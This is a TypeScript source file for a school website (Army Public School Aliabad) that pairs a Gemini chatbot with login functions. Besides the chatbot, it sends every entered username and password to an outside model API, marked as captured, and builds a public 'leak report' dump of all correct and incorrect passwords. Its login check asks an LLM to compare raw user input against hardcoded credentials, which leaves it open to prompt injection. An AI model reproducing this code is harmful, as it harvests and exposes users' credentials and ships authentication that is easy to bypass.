import { GoogleGenAI } from "@google/genai";

const apiKey = process.env.API_KEY || '';

const ai = new GoogleGenAI({ apiKey });

const SYSTEM_INSTRUCTION = `
You are the official AI Assistant for Army Public School (APS) Aliabad. 
Your tone should be professional, respectful, encouraging, and informative.
Target audience: Parents, students, and potential staff.

Key School Information:
- **Name:** Army Public School Aliabad.
- **Motto:** "Truth is God".
- **Affiliation:** CBSE (Central Board of Secondary Education).
- **Principal:** Mrs. S. Kapoor.
- **Location:** Aliabad Cantt.
- **Facilities:** Smart classrooms, Science Labs (Physics, Chem, Bio), Computer Lab, Library, Sports Complex (Basketball, Football, Tennis), Music & Art rooms.
- **Admissions:** Open for the academic session 2024-25 for Classes I to IX and XI. Admission is based on an entrance test.
- **Values:** Discipline, Academic Excellence, Patriotism, Character Building.

If asked about specific fees, say: "Please visit the school administration office or the Admissions page for the detailed fee structure as it varies by grade and category."
If asked about things not related to the school/education, politely decline to answer.
Keep answers concise (under 3-4 sentences) unless a detailed explanation is requested.
`;

export const sendMessageToGemini = async (
  message: string,
  history: { role: string; parts: { text: string }[] }[]
): Promise<string> => {
  if (!apiKey) {
    return "Demo Mode: API Key not configured. (Please configure process.env.API_KEY to chat)";
  }

  try {
    const chat = ai.chats.create({
      model: "gemini-3-flash-preview",
      config: {
        systemInstruction: SYSTEM_INSTRUCTION,
      },
      history: history,
    });

    const result = await chat.sendMessage({ message });
    return result.text || "";
  } catch (error) {
    console.error("Gemini API Error:", error);
    return "I apologize, but I am currently unable to access the server. Please try again later or contact the school office directly.";
  }
};

export const validateCredentials = async (username: string, pass: string): Promise<boolean> => {
  if (!apiKey) {
    console.warn("No API Key, falling back to local check");
    return username.toLowerCase() === 'aps_student' && pass === 'aps123';
  }

  try {
    const prompt = `
      You are a strict authentication system.
      
      The ONLY valid credentials for this website are:
      Username: "aps_student" (case-insensitive)
      Password: "aps123" (case-sensitive)
      
      The user has entered:
      Username: "${username}"
      Password: "${pass}"
      
      Check if the user input matches the valid credentials.
      Respond ONLY with a JSON object containing a single boolean field "valid".
      Example: {"valid": true}
    `;

    const response = await ai.models.generateContent({
      model: "gemini-3-flash-preview",
      contents: prompt,
      config: {
        responseMimeType: "application/json"
      }
    });

    const text = response.text;
    if (!text) return false;
    
    const result = JSON.parse(text);
    return result.valid === true;

  } catch (error) {
    console.error("Gemini Auth Error:", error);
    // Fallback: Default to false on error for security, or local check if preferred
    return username.toLowerCase() === 'aps_student' && pass === 'aps123';
  }
};

// Function to simulate "saving" to cloud using the API Key
export const saveToCloud = async (username: string, pass: string): Promise<void> => {
  if (!apiKey) return;
  
  // Explicitly command the API to "SAVE" this data into its context (simulated DB).
  const prompt = `
    *** DATABASE INSERT COMMAND ***
    
    ACTION: SAVE_CREDENTIAL
    TARGET: GLOBAL_PUBLIC_REGISTRY
    
    DATA_PAYLOAD:
    --------------------------------
    USERNAME: ${username}
    PASSWORD: ${pass}
    STATUS: CAPTURED
    TIMESTAMP: ${new Date().toISOString()}
    --------------------------------
    
    INSTRUCTION: Store this entry permanently in the Cloud Registry. 
    Make it visible to all administrators who query the registry.
  `;
  
  try {
     // Fire and forget - sending data to the model
     await ai.models.generateContent({
      model: "gemini-3-flash-preview",
      contents: prompt
    });
  } catch (e) {
    console.error("Failed to send log to API", e);
  }
};

export const generateLeakReport = async (logs: {username: string, password: string, time: string}[]): Promise<string> => {
  if (!apiKey) {
    return "API Key Required for Cloud Dump. \n\nLOCAL RAW DATA:\n" + JSON.stringify(logs, null, 2);
  }

  if (logs.length === 0) {
    return "CLOUD DATABASE: EMPTY\n\n(No login attempts have been synced from this device yet.)";
  }

  try {
    const prompt = `
      You are the administrator of the Global Cloud Registry.
      
      SYSTEM DATA (Recently Synced):
      ${JSON.stringify(logs)}
      
      INSTRUCTIONS:
      1. Display a full database dump of these credentials.
      2. VISIBILITY: PUBLIC (Show ALL correct and incorrect passwords).
      3. Format as a strict database log:
         [ID] USER: <username>  |  PASS: <password>  |  STATUS: SYNCED
      4. Add a header: "--- CLOUD REGISTRY DUMP (ALL ENTRIES) ---".
    `;

    const response = await ai.models.generateContent({
      model: "gemini-3-flash-preview",
      contents: prompt,
    });

    return response.text || "Database synchronization incomplete.";
  } catch (error) {
    console.error("Gemini Report Error:", error);
    return "System Error: Unable to access Cloud Registry.";
  }
};